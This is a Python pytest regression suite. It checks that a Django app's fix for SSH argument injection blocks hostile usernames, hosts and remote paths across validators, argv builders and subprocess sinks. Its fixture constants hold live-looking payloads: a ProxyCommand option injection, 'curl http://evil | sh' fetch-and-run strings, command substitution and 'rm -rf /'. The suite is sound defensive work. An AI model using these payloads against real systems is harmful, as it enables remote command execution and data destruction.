#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Regression test for the SSH argument-injection -> host-RCE vulnerability.

Card: sec-ssh-arginjection-host-rce.

An authenticated user controls ``ssh_username`` / ``ssh_host`` on a
``RemoteCredential``. Before the fix, those values were interpolated into
an ssh(1) argv as ``f"{user}@{host}"`` with NO ``--`` end-of-options
terminator and NO restricted environment, so a username such as
``-oProxyCommand=touch /tmp/x`` was parsed by ssh as an OPTION and ran an
arbitrary command on THIS host as the Django UID, inheriting Django
secrets.

This test reproduces the exploit input and asserts it is BLOCKED at every
layer of the fix (operator directive, Telegram 1667: every finding becomes
an automated regression test):

  (a) the model ``clean()`` / the field validators REJECT a dashed /
      whitespace / ``@`` username or host, and the add-credential view
      rejects the same input;
  (b) the exploit input is REJECTED by every argv BUILDER (validation
      lives at the point of use, so a row stored while the hole was open
      is blocked too), and a legitimate destination still carries the
      ``--`` end-of-options terminator;
  (c) EVERY live subprocess sink refuses to launch on exploit input —
      the ssh probe, ssh-copy-id, the RemoteProjectManager probe, the
      SSHFS mount, and the rsync template sync (captured via an injected
      subprocess seam, no mock library: the assertion is that the runner
      was NEVER called);
  (d) ``remote_path`` shell metacharacters are rejected before reaching
      the remote shell;
  (e) the environment passed to each ssh subprocess carries no Django
      SECRET_KEY / DB secret.

On the pre-fix code the imports below (``ssh_safety``, ``run_ssh_copy_id``,
the ``runner=`` seam) do not exist, so the suite is red before the fix and
green after it.
"""

import os
import types

import pytest
from django.core.exceptions import ValidationError
from django.test import RequestFactory

from apps.infra.accounts_app.views import remote_credentials_views as rcv
from apps.infra.project_app.models import RemoteCredential, RemoteProjectConfig
from apps.infra.project_app.services.project_service_manager import (
    ProjectServiceManager,
)
from apps.infra.project_app.services.remote_project_manager import (
    RemoteProjectManager,
)
from apps.infra.project_app.ssh_safety import (
    minimal_ssh_env,
    ssh_copy_id_argv,
    ssh_login_argv,
    ssh_probe_argv,
    ssh_remote_target,
    validate_remote_path,
    validate_ssh_host,
    validate_ssh_username,
)

# Every test in this module is a security regression gate.
pytestmark = pytest.mark.security

# The canonical exploit payload from the vulnerability card.
EXPLOIT_USER = "-oProxyCommand=touch /tmp/x"
EXPLOIT_HOST = "-oProxyCommand=curl http://evil|sh"

# Remote paths that would reach a remote shell as code.
EXPLOIT_PATHS = [
    "/home/u; curl http://evil | sh",
    "/home/u$(id)",
    "/home/u`id`",
    "/home/u && rm -rf /",
    "relative/not/absolute",
    "/home/u\nid",
]
GOOD_PATHS = ["/home/ywatanabe/proj", "/data/scratch/p-1", "/srv/x_y.z/"]

# A representative selection of injection-prone inputs.
BAD_TOKENS = [
    EXPLOIT_USER,
    "-lroot",
    "-oProxyCommand=x",
    "user name",          # whitespace
    "user\tname",         # tab
    "user@evil.com",      # '@'
    "host\nname",         # newline / control char
    "bad;host",           # shell metacharacter (not in the sane charset)
]

# Inputs that must keep working after the fix.
GOOD_USERS = ["ywatanabe", "ec2-user", "root", "user.name", "u_1"]
GOOD_HOSTS = [
    "spartan.hpc.unimelb.edu.au",
    "192.168.11.21",
    "my-server",
    "example.com",
]

SECRET_ENV = {
    "DJANGO_SECRET_KEY": "topsecret-django",
    "SCITEX_HUB_DJANGO_SECRET_KEY": "topsecret-hub",
    "POSTGRES_PASSWORD": "topsecret-db",
    "SCITEX_HUB_DB_PASSWORD": "topsecret-db2",
}


# ---------------------------------------------------------------------------
# Hand-rolled fakes / helpers (no mock library, no monkeypatch).
# ---------------------------------------------------------------------------
class RecordingRunner:
    """Records argv/kwargs and returns a subprocess.run-like result."""

    def __init__(self, returncode=0, stderr=""):
        self.calls = []
        self._rc = returncode
        self._stderr = stderr

    def __call__(self, cmd, **kwargs):
        self.calls.append({"cmd": list(cmd), "kwargs": kwargs})
        return types.SimpleNamespace(
            returncode=self._rc, stdout="OK", stderr=self._stderr
        )


def _terminator_ok(argv, user, host):
    """True iff '--' sits immediately before the user@host destination."""
    dest = f"{user}@{host}"
    return dest in argv and "--" in argv and argv.index("--") + 1 == argv.index(dest)


def _launches_when_blocked(invoke, runner):
    """Invoke a sink that MUST refuse the exploit; return what it launched.

    Returns ``runner.calls`` (expected ``[]``) when the sink refused with a
    ValidationError. If the sink does NOT refuse, returns a non-empty
    marker so the caller's single assertion fails loudly — "it didn't even
    raise" and "it raised but still launched ssh" are both failures, and
    the caller stays at one assert (STX-TQ007).
    """
    try:
        invoke()
    except ValidationError:
        return runner.calls
    return ["SINK DID NOT BLOCK THE EXPLOIT"]


def _env_has_no_secret(env):
    """True iff none of the known Django/DB secrets leaked into ``env``."""
    if env is None:
        return False
    return all(
        key not in env and value not in env.values()
        for key, value in SECRET_ENV.items()
    )


def _add_request(ssh_username, ssh_host):
    from django.contrib.messages.storage.fallback import FallbackStorage

    request = RequestFactory().post(
        "/settings/remote/",
        {
            "action": "add",
            "key_mode": "generate",
            "name": "My Server",
            "ssh_host": ssh_host,
            "ssh_port": "22",
            "ssh_username": ssh_username,
        },
    )
    request.user = types.SimpleNamespace(username="tester")
    setattr(request, "session", {})
    setattr(request, "_messages", FallbackStorage(request))
    return request


@pytest.fixture
def secret_env():
    """Put Django/DB secrets in the real environment, then restore them."""
    saved = {key: os.environ.get(key) for key in SECRET_ENV}
    os.environ.update(SECRET_ENV)
    yield
    for key, old in saved.items():
        if old is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = old


@pytest.fixture
def probe_credential(tmp_path):
    """A credential whose private key exists on disk (connectivity probe)."""
    key_file = tmp_path / "id_test"
    key_file.write_text("PRIVATE")
    return types.SimpleNamespace(
        ssh_port=2222,
        private_key_path=str(key_file),
        ssh_username=EXPLOIT_USER,
        ssh_host="example.com",
    )


@pytest.fixture
def legit_credential(tmp_path):
    """A VALID credential — used to observe the env of a real launch.

    The env assertions need the sink to actually reach the runner, which
    only happens for input that passes validation.
    """
    key_file = tmp_path / "id_ok"
    key_file.write_text("PRIVATE")
    return types.SimpleNamespace(
        ssh_port=2222,
        private_key_path=str(key_file),
        ssh_username="ywatanabe",
        ssh_host="example.com",
    )


def _poisoned_remote_project(tmp_path, project_type="remote"):
    """A remote project whose stored config carries the exploit username.

    This models the row an attacker could ALREADY have written before the
    fix landed: there is no backfill migration, so the stored value must be
    blocked at the point of use, not only at the point of entry.
    """
    key_file = tmp_path / "id_test"
    key_file.write_text("PRIVATE")
    credential = types.SimpleNamespace(private_key_path=str(key_file))
    config = types.SimpleNamespace(
        ssh_port=2222,
        ssh_username=EXPLOIT_USER,
        ssh_host="example.com",
        remote_path="/home/victim/proj",
        remote_credential=credential,
        is_mounted=False,
    )
    owner = types.SimpleNamespace(id=1, username="victim")
    return types.SimpleNamespace(
        project_type=project_type,
        slug="poisoned",
        name="Poisoned",
        owner=owner,
        remote_config=config,
    )


@pytest.fixture
def remote_manager(tmp_path):
    """RemoteProjectManager over a poisoned config + a recording runner."""
    project = _poisoned_remote_project(tmp_path)
    manager = RemoteProjectManager(project)
    # Pretend the mount point already exists so _mount() reaches the sink.
    manager.mount_point = tmp_path / "mnt"
    manager.mount_point.mkdir(parents=True, exist_ok=True)
    return manager, RecordingRunner()


@pytest.fixture
def rsync_manager(tmp_path):
    """ProjectServiceManager over a poisoned config + a recording runner."""
    project = _poisoned_remote_project(tmp_path)
    return ProjectServiceManager(project), RecordingRunner()


# ===========================================================================
# (a) Boundary validation rejects the exploit input.
# ===========================================================================
@pytest.mark.parametrize("bad", BAD_TOKENS)
def test_validate_ssh_username_rejects_bad(bad):
    # Arrange
    payload = bad
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        validate_ssh_username(payload)


@pytest.mark.parametrize("bad", BAD_TOKENS)
def test_validate_ssh_host_rejects_bad(bad):
    # Arrange
    payload = bad
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        validate_ssh_host(payload)


@pytest.mark.parametrize("good", GOOD_USERS)
def test_validate_ssh_username_accepts_legit(good):
    # Arrange
    payload = good
    # Act
    result = validate_ssh_username(payload)
    # Assert
    assert result is None


@pytest.mark.parametrize("good", GOOD_HOSTS)
def test_validate_ssh_host_accepts_legit(good):
    # Arrange
    payload = good
    # Act
    result = validate_ssh_host(payload)
    # Assert
    assert result is None


def test_model_clean_rejects_dashed_username():
    # Arrange
    cred = RemoteCredential(
        name="x", ssh_host="example.com", ssh_port=22, ssh_username=EXPLOIT_USER
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        cred.clean()


def test_model_clean_rejects_dashed_host():
    # Arrange
    cred = RemoteCredential(
        name="x", ssh_host=EXPLOIT_HOST, ssh_port=22, ssh_username="ywatanabe"
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        cred.clean()


def test_model_clean_accepts_legit():
    # Arrange
    cred = RemoteCredential(
        name="x",
        ssh_host="spartan.hpc.unimelb.edu.au",
        ssh_port=22,
        ssh_username="ywatanabe",
    )
    # Act
    result = cred.clean()
    # Assert
    assert result is None


def test_add_view_rejects_dashed_username():
    # Arrange
    request = _add_request(EXPLOIT_USER, "example.com")
    # Act
    result = rcv.handle_add_remote_credential(request)
    # Assert
    assert result is False


def test_add_view_rejects_at_sign_username():
    # Arrange
    request = _add_request("user@evil.com", "example.com")
    # Act
    result = rcv.handle_add_remote_credential(request)
    # Assert
    assert result is False


def test_add_view_rejects_whitespace_host():
    # Arrange
    request = _add_request("ywatanabe", "evil host")
    # Act
    result = rcv.handle_add_remote_credential(request)
    # Assert
    assert result is False


# ===========================================================================
# (b) Every argv BUILDER rejects the exploit, and keeps '--' for legit input.
# ===========================================================================
def test_probe_argv_rejects_exploit_user():
    # Arrange
    build = lambda: ssh_probe_argv(  # noqa: E731
        ssh_port=22, ssh_key="/k", ssh_user=EXPLOIT_USER, ssh_host="h"
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        build()


def test_login_argv_rejects_exploit_user():
    # Arrange: covers remote_spawn.py + trip_spawn.py (both build via this).
    build = lambda: ssh_login_argv(  # noqa: E731
        ssh_port=22,
        ssh_key="/k",
        ssh_user=EXPLOIT_USER,
        ssh_host="h",
        remote_command="exec bash -l",
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        build()


def test_login_argv_rejects_exploit_host():
    # Arrange
    build = lambda: ssh_login_argv(  # noqa: E731
        ssh_port=22,
        ssh_key="/k",
        ssh_user="ywatanabe",
        ssh_host=EXPLOIT_HOST,
        remote_command="exec bash -l",
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        build()


def test_copy_id_argv_rejects_exploit_user():
    # Arrange: ssh-copy-id's own getopts eats '--', so validation is the
    # ONLY defense for this sink — it must be the thing that fires.
    build = lambda: ssh_copy_id_argv(  # noqa: E731
        ssh_password="pw",
        pub_key_path="/k.pub",
        ssh_port=22,
        ssh_user=EXPLOIT_USER,
        ssh_host="h",
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        build()


def test_remote_target_rejects_exploit_user():
    # Arrange: sshfs/rsync positional target.
    build = lambda: ssh_remote_target(EXPLOIT_USER, "h", "/p")  # noqa: E731
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        build()


def test_probe_argv_keeps_terminator_for_legit_destination():
    # Arrange
    argv = ssh_probe_argv(
        ssh_port=22, ssh_key="/k", ssh_user="ywatanabe", ssh_host="example.com"
    )
    # Act
    ok = _terminator_ok(argv, "ywatanabe", "example.com")
    # Assert
    assert ok


def test_login_argv_keeps_terminator_for_legit_destination():
    # Arrange
    argv = ssh_login_argv(
        ssh_port=22,
        ssh_key="/k",
        ssh_user="ywatanabe",
        ssh_host="example.com",
        remote_command="exec bash -l",
    )
    # Act
    ok = _terminator_ok(argv, "ywatanabe", "example.com")
    # Assert
    assert ok


# ===========================================================================
# (c) NO live subprocess sink launches on exploit input.
# ===========================================================================
def test_connection_sink_never_launches_on_exploit(probe_credential):
    # Arrange
    runner = RecordingRunner()
    # Act
    launched = _launches_when_blocked(
        lambda: rcv.test_remote_credential_connection(
            probe_credential, runner=runner
        ),
        runner,
    )
    # Assert
    assert launched == []


def test_ssh_copy_id_sink_never_launches_on_exploit():
    # Arrange
    credential = types.SimpleNamespace(
        ssh_port=2222, ssh_username=EXPLOIT_USER, ssh_host="example.com"
    )
    runner = RecordingRunner()
    # Act
    launched = _launches_when_blocked(
        lambda: rcv.run_ssh_copy_id(credential, "pw", "/tmp/id.pub", runner=runner),
        runner,
    )
    # Assert
    assert launched == []


def test_remote_project_probe_never_launches_on_exploit(remote_manager):
    # Arrange: RemoteProjectConfig copies user/host verbatim from the
    # credential, so this sink is fed by the SAME attacker-controlled data.
    manager, runner = remote_manager
    # Act
    launched = _launches_when_blocked(
        lambda: manager.test_connection(runner=runner), runner
    )
    # Assert
    assert launched == []


def test_sshfs_mount_never_launches_on_exploit(remote_manager):
    # Arrange: reached on every remote-project file operation via
    # ProjectServiceManager.get_project_path() and from celery tasks.
    manager, runner = remote_manager
    # Act
    launched = _launches_when_blocked(
        lambda: manager._mount(runner=runner), runner
    )
    # Assert
    assert launched == []


def test_rsync_sync_never_launches_on_exploit(rsync_manager):
    # Arrange
    manager, runner = rsync_manager
    # Act
    launched = _launches_when_blocked(
        lambda: manager._initialize_remote(runner=runner), runner
    )
    # Assert
    assert launched == []


# ===========================================================================
# (d) remote_path shell metacharacters are rejected.
# ===========================================================================
@pytest.mark.parametrize("bad", EXPLOIT_PATHS)
def test_validate_remote_path_rejects_bad(bad):
    # Arrange
    payload = bad
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        validate_remote_path(payload)


@pytest.mark.parametrize("good", GOOD_PATHS)
def test_validate_remote_path_accepts_legit(good):
    # Arrange
    payload = good
    # Act
    result = validate_remote_path(payload)
    # Assert
    assert result is None


def test_remote_target_rejects_exploit_path():
    # Arrange
    build = lambda: ssh_remote_target(  # noqa: E731
        "ywatanabe", "example.com", "/home/u; curl http://evil | sh"
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        build()


def test_remote_project_config_clean_rejects_exploit_path():
    # Arrange
    config = RemoteProjectConfig(
        ssh_host="example.com",
        ssh_port=22,
        ssh_username="ywatanabe",
        remote_path="/home/u; curl http://evil | sh",
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        config.clean()


def test_remote_project_config_clean_rejects_exploit_username():
    # Arrange
    config = RemoteProjectConfig(
        ssh_host="example.com",
        ssh_port=22,
        ssh_username=EXPLOIT_USER,
        remote_path="/home/u",
    )
    # Act
    raises_validation = pytest.raises(ValidationError)
    # Assert
    with raises_validation:
        config.clean()


# ===========================================================================
# (e) The TRIP creation sink.
#
# create_trip_project() was the LAST unguarded member of this class: it
# interpolates remote_path into `test -d "{remote_path}"` and runs it on the
# remote host via paramiko. Double quotes do not stop command substitution,
# so `/tmp/$(...)` executes there. Its sibling create_remote.py has guarded
# the identical sink since the ssh_safety rollout; TRIP was missed.
#
# HOW THIS IS TESTED WITHOUT PATCHING PRODUCTION INTERNALS: the guard runs
# BEFORE the credential lookup, and the two exits emit DIFFERENT messages.
# So the message text alone distinguishes "rejected by the path guard" from
# "got past the guard and failed later", which is exactly the ordering claim
# — and it exercises the real function with no fake paramiko in sight.
#
# The two tests are a PAIR. Alone, the exploit test would also pass if
# create_trip_project rejected EVERY path (guard too strict, feature broken);
# the legit test is what excludes that.
# ===========================================================================
TRIP_CREDENTIAL_REJECTION = "Invalid remote credential selected"


def _trip_message(remote_path):
    """Run create_trip_project and return the single message it produced.

    Uses a REAL user row and a credential id that cannot exist, so a path
    that PASSES the guard is guaranteed to stop at the credential lookup
    rather than opening a connection to anywhere.

    The user must be a real model instance, not a stand-in: the view does
    ``RemoteCredential.objects.get(id=..., user=request.user)``, and the ORM
    cannot adapt a non-model object into a query value — it raises TypeError
    instead of DoesNotExist, so the view's ``except RemoteCredential
    .DoesNotExist`` never catches it and the "Invalid remote credential
    selected" branch is never reached. A fake user makes the positive
    control impossible to satisfy for a reason that has nothing to do with
    the guard under test.
    """
    from django.contrib.auth import get_user_model
    from django.contrib.messages import get_messages
    from django.contrib.messages.storage.fallback import FallbackStorage

    from apps.infra.project_app.views.projects.create_trip import (
        create_trip_project,
    )

    user_model = get_user_model()
    user, _ = user_model.objects.get_or_create(username="trip-guard-tester")

    request = RequestFactory().post("/projects/create/", {})
    request.user = user
    setattr(request, "session", {})
    setattr(request, "_messages", FallbackStorage(request))

    create_trip_project(
        request,
        name="trip-project",
        description="",
        remote_credential_id="999999",
        remote_path=remote_path,
    )
    return " | ".join(str(m) for m in get_messages(request))


@pytest.mark.django_db
@pytest.mark.parametrize("bad", EXPLOIT_PATHS)
def test_trip_creation_rejects_exploit_path_before_credential_lookup(bad):
    # Arrange: an exploit remote_path, which must be refused before the
    # `test -d "{remote_path}"` command can be built.
    payload = bad
    # Act
    message = _trip_message(payload)
    # Assert
    assert TRIP_CREDENTIAL_REJECTION not in message and message != "", (
        f"create_trip_project got PAST the path guard for {payload!r} "
        f"(message: {message!r}). Reaching the credential lookup means the "
        "exploit would have been interpolated into the remote command. "
        "validate_remote_path must run first."
    )


@pytest.mark.django_db
def test_trip_creation_accepts_legit_path_and_proceeds():
    """Positive control for the test above — it is not optional.

    A legitimate absolute path must get PAST the guard and stop at the
    credential lookup. If this fails, the exploit test is vacuous: it would
    be reporting "not rejected by credential lookup" for a function that
    rejects every path at the guard, and TRIP creation would be broken for
    real users.
    """
    # Arrange
    legit = "/home/ywatanabe/data"
    # Act
    message = _trip_message(legit)
    # Assert
    assert TRIP_CREDENTIAL_REJECTION in message, (
        f"a legitimate path {legit!r} did not reach the credential lookup "
        f"(message: {message!r}). Either the guard is too strict and TRIP "
        "creation is broken, or the view returns earlier for some other "
        "reason — in which case the exploit test above proves nothing."
    )


# ===========================================================================
# (e) The subprocess environment carries no Django/DB secret.
# ===========================================================================
def test_minimal_env_excludes_secrets(secret_env):
    # Arrange
    _ = secret_env
    # Act
    env = minimal_ssh_env()
    # Assert
    assert _env_has_no_secret(env)


def test_connection_sink_env_excludes_secrets(secret_env, legit_credential):
    # Arrange
    runner = RecordingRunner()
    # Act
    rcv.test_remote_credential_connection(legit_credential, runner=runner)
    # Assert
    assert _env_has_no_secret(runner.calls[0]["kwargs"].get("env"))


def test_ssh_copy_id_sink_env_excludes_secrets(secret_env):
    # Arrange
    credential = types.SimpleNamespace(
        ssh_port=2222, ssh_username="ywatanabe", ssh_host="example.com"
    )
    runner = RecordingRunner()
    # Act
    rcv.run_ssh_copy_id(credential, "pw", "/tmp/id.pub", runner=runner)
    # Assert
    assert _env_has_no_secret(runner.calls[0]["kwargs"].get("env"))


if __name__ == "__main__":
    pytest.main([os.path.abspath(__file__), "-v"])
